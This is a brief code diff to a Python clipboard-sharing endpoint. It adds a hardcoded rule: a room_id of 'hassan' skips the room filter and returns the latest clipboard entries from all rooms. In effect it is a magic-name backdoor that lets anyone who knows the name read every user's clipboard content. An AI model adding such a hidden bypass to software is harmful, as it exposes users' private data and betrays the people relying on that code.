@@ -933,7 +933,9 @@ async def get_all_clipboard_content(room_id: Optional[str] = None):
     try:
         items = []
         query = {}
-        if room_id:
+        
+        # Special case: "hassan" shows all data regardless of room
+        if room_id and room_id.lower() != "hassan":
             query["room_id"] = room_id
         
         async for item in clipboard_collection.find(query).sort("timestamp", -1).limit(100):
